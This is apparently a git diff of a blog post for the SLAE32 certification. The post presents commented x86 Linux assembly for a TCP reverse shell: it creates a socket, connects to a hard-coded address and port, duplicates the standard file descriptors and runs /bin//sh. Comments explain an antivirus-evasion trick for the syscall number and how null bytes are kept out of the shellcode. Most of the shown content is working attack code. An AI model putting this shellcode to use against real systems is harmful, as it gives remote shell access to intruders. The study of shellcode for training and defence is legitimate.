@@ -3,9 +3,9 @@ layout: post
 title: SLAE32 Assignment 2 - reverse shell
 excerpt: asm code and comment for my revshell
 ---
-    ; name     : tcprevshell
+    ; name       : tcprevshell
     ; author     : Sandro "guly" Zaccarini SLAE-1037
-    ; purpose    : the program will create a new connection to a given ip/port and present
+    ; purpose    : the program will create a new connection to given ip/port and present
     ;              a shell to it this code has been written for SLAE32 assignment 2
     ; references : https://syscalls.kernelgrok.com/ , /usr/include/linux/net.h ,
     ;              man socketcall
@@ -14,13 +14,15 @@ excerpt: asm code and comment for my revshell
     ; high level flow:
     ; socket -> connect -> dup fd -> spawn /bin//sh
     ;
-    ; i'll use different function name to keep it more readable. mostly, function are never called and are used just as "anchor for the human eyes"
+    ; i'll use different function name to keep it more readable. mostly, function are
+    ; never called and are used just as "anchor for the human eyes"
     
     global _start
     
     section .text
     
-    ; dummy function used to break easily on gdb while debugging, just rets without touching anything
+    ; dummy function used to break easily on gdb while debugging, just rets without
+    ; touching anything.
     ; i used to place a call trap and recompile, while having a "b trap" on ~/.gdbinit
     trap:
     ret
@@ -32,25 +34,29 @@ excerpt: asm code and comment for my revshell
     ret
     
     socketcall2eax:
-    ; place syscall code for socketcall in eax, which is 0x66, no need to zero because i use mov.
-    ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV, when 0x33 is the call acct and looks harmless to me
+    ; syscall code for socketcall in eax, which is 0x66, no need to zero because of mov
+    ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV,
+    ; when 0x33 is the call acct and looks harmless to me
     mov al,0x33
     add al,0x33
     ret
     
     ; main code starts here
     _start:
-    ; start by zeroing eax,ebx. not really needed because registers are clean, but better safe than sorry
+    ; start by zeroing eax,ebx. not really needed because registers are clean, but better
+    ; safe than sorry
     call zero
     
     createsocket:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : create a socket
     ; references  : man socket
-    ; description :
-    ; socketcall is the syscall used to work with socket. i'm going to use this syscall to create and connect
-    ; the very first thing i have to do, is to create the socket itself. by reading references, i see that she needs 3 registers:
-    ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall call of course and that's why i created a function on top
+    ; description : socketcall is the syscall used to work with socket. i'm going to use
+    ;               this syscall to create and connect
+    ;               the very first thing i have to do, is to create the socket itself.
+    ;               by reading references, i see that she needs 3 registers:
+    ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall
+             call of course and that's why i created a function on top
     ; ebx => socket call id, that is 0x1 for socket creation
     ; ecx => pointer to socket args
     ;
@@ -73,17 +79,19 @@ excerpt: asm code and comment for my revshell
     ; prepare eax to hold the socketcall value as discussed before
     call socketcall2eax
     
-    ; because ebx is 0, i can just inc to have it to 1 for socketcall to call socket (pun intended :) )
+    ; because ebx is 0, i can just inc to have it to 1 for socketcall to call socket
+    ; (pun intended :) )
     inc ebx
     
     ; do the call and create socket
     int 0x80
     
-    ; because syscall rets to eax, if everything's good, eax will hold socket file descriptor: save it to esi to have it safe for the whole run
+    ; because syscall rets to eax, if everything's good, eax will hold socket fd:
+    ; save it to esi to have it safe for the whole run
     mov esi,eax
     
     connect:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : connect to raddr:rport
     ; references  : man connect , man 7 ip
     ; description :
@@ -135,7 +143,7 @@ excerpt: asm code and comment for my revshell
     int 0x80
     
     dupfd:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : create fd used by /bin//sh
     ; references  : man dup2
     ; description : every shell has three file descriptor: STDIN(0), STDOUT(1), STDERR(2)
@@ -144,7 +152,8 @@ excerpt: asm code and comment for my revshell
     ; ebx => clientid
     ; ecx => newfd id, said file descriptor
     ;
-    ; i'm going to create them by looping using ecx, to save some instruction. ecx will start at 2, then is dec and fd is created.
+    ; i'm going to create them by looping using ecx, to save some instruction.
+    ; ecx will start at 2, then is dec and fd is created.
     ; as soon as ecx is 0, the loop ends
     
     
@@ -170,17 +179,19 @@ excerpt: asm code and comment for my revshell
     jnz dup2
     
     spawnshell:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : spawn /bin//sh
     ; references  : man execve
-    ; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the shellcode itself
-    ; and null terminating it by pushing a zeroed register at first
+    ; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the
+    ;               shellcode and null terminating it by pushing a zeroed register
+    ;
     ; eax => execve call, 0xB
     ; ebx => pointer to executed string, which will be /bin//sh null terminated
     ; ecx => pointer to args to executed command, that could be 0x0
     ; edx => pointer to environment, which could be 0x0
     ;
-    ; i need to push a null byte to terminate the string, easiest way is to zero a reg and push it but i know ecx is 0x0 so i can save one op
+    ; i need to push a nullbyte to terminate the string, easiest way is to zero a reg and
+    ; push it but i know ecx is 0x0 so i can save one op
     push ecx
     push 0x68732f2f
     push 0x6e69622f
@@ -212,7 +223,8 @@ excerpt: asm code and comment for my revshell
     ; 65533 converted in hex, then little endian
     rport equ 0xFDFF
     ; 172.16.201.162 in hex, then little endian
-    ; i'm lucky that i don't have any 0 in my address, else raddr will contain null bytes. i'm going to publish also a 02_revshell_tcp_127.0.0.1.asm to challenge myself a bit
+    ; i'm lucky that i don't have any 0 in my address, else raddr will contain null bytes
+    ; i'm going to publish also a 02_revshell_tcp_127.0.0.1.asm to challenge myself a bit
     raddr equ 0xa2c910ac
     
-    ; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
